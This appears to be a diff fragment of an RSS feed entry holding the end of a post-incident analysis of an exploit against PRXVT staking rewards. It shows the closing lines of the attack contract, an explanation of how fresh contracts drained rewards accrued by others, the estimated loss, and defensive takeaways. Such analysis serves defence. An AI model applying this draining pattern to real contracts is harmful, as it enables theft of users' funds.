+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;    IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: #859900;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(a1),&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt; IExploit&lt;&#x2F;span&gt;&lt;span&gt;(stPRXVT).&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(attacker));&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    a1.&lt;&#x2F;span&gt;&lt;span style=&quot;color: #268BD2;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;();&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Each &lt;code&gt;Attack&lt;&#x2F;code&gt; instance starts with zero reward history, receives stPRXVT, and immediately drains PRXVT rewards that were accrued by others.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;damage&quot;&gt;Damage&lt;&#x2F;h3&gt;
+&lt;p&gt;The exploit contract still holds PRXVT tokens, but since the team pulled the LP, it’s hard to cash them out.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy4.png&quot; alt=&quot;Exploit contract balance and LP pulled&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The final loss is estimated at $97,852.95.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;img&#x2F;prxvt&#x2F;analy5.png&quot; alt=&quot;Estimated final loss&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;takeaways&quot;&gt;Takeaways&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Reward accounting must distinguish between staked amounts (deposited via &lt;code&gt;stake&lt;&#x2F;code&gt;) and arbitrary transfers. Transferable staking tokens should not auto-accrue rewards without a staking event.&lt;&#x2F;li&gt;
+&lt;li&gt;Using a non-transferable receipt token or blocking transfers to non-staking addresses would have prevented this vector.&lt;&#x2F;li&gt;
+&lt;li&gt;Add invariant tests: “Receiving staking tokens via &lt;code&gt;transfer&lt;&#x2F;code&gt; must not increase &lt;code&gt;earned()&lt;&#x2F;code&gt; or allow &lt;code&gt;claimReward()&lt;&#x2F;code&gt; to succeed.”&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</description>
+      </item>
+    </channel>
+</rss>
